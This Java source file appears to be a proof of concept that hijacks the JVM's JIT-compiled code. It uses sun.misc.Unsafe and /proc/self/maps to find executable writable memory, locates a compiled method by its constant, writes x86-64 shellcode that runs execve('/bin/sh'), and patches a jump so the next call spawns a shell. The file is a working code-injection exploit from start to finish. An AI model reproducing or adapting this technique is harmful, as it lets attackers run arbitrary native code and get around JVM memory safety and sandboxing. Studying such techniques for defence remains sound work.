import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import sun.misc.Unsafe;

public final class Hijack2 {
    static Unsafe U;
    static volatile long sink;
    static final byte[] PAT = {(byte) 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11};

    public static void main(String[] a) throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        U = (Unsafe) f.get(null);

        List<String> maps = Files.readAllLines(Path.of("/proc/self/maps"));
        long[] best = null;
        for (String l : maps) {
            if (!l.contains("rwx")) continue;
            String[] r = l.split("\\s+")[0].split("-");
            long s = Long.parseUnsignedLong(r[0], 16), e = Long.parseUnsignedLong(r[1], 16);
            if (best == null || e - s > best[1] - best[0]) best = new long[]{s, e};
        }
        if (best == null) { System.out.println("no rwx"); return; }
        System.out.printf("rwx %016x-%016x%n", best[0], best[1]);

        for (int i = 0; i < 300_000; i++) sink += probe(i);
        System.out.println("probe warmed");

        long hit = -1;
        int n = 0;
        outer:
        for (long p = best[0]; p < best[1] - 8; p++) {
            if (U.getByte(p) != PAT[0]) continue;
            for (int i = 1; i < 8; i++) if (U.getByte(p + i) != PAT[i]) continue outer;
            n++;
            if (hit < 0) hit = p;
        }
        System.out.println("hits=" + n + " first=" + Long.toHexString(hit));
        if (hit < 0) { System.out.println("PATTERN NOT FOUND"); return; }

        long site = hit - 2;
        int b0 = U.getByte(site) & 0xff, b1 = U.getByte(site + 1) & 0xff;
        System.out.printf("site=%016x bytes=%02x %02x%n", site, b0, b1);
        if (!((b0 == 0x48 || b0 == 0x49) && b1 >= 0xb8 && b1 <= 0xbf)) {
            System.out.println("SITE MISMATCH"); return;
        }

        long sc = best[1] - 0x1000;
        byte[] shell = {
            0x48, 0x31, (byte) 0xd2, 0x52,
            0x48, (byte) 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
            0x53, 0x48, (byte) 0x89, (byte) 0xe7,
            0x48, 0x31, (byte) 0xf6,
            0x31, (byte) 0xc0, (byte) 0xb0, 0x3b, 0x0f, 0x05
        };
        for (int i = 0; i < shell.length; i++) U.putByte(sc + i, shell[i]);
        System.out.println("shellcode at " + Long.toHexString(sc) + " ok=" +
                ((U.getByte(sc) & 0xff) == 0x48 && (U.getByte(sc + 1) & 0xff) == 0x31));

        int rel = (int) (sc - (site + 5));
        U.putByte(site, (byte) 0xE9);
        U.putByte(site + 1, (byte) (rel & 0xff));
        U.putByte(site + 2, (byte) ((rel >> 8) & 0xff));
        U.putByte(site + 3, (byte) ((rel >> 16) & 0xff));
        U.putByte(site + 4, (byte) ((rel >> 24) & 0xff));
        System.out.println("patched, calling probe...");

        sink += probe(1);
        System.out.println("still alive");
    }

    static long probe(long x) { return x ^ 0x1122334455667788L; }
}
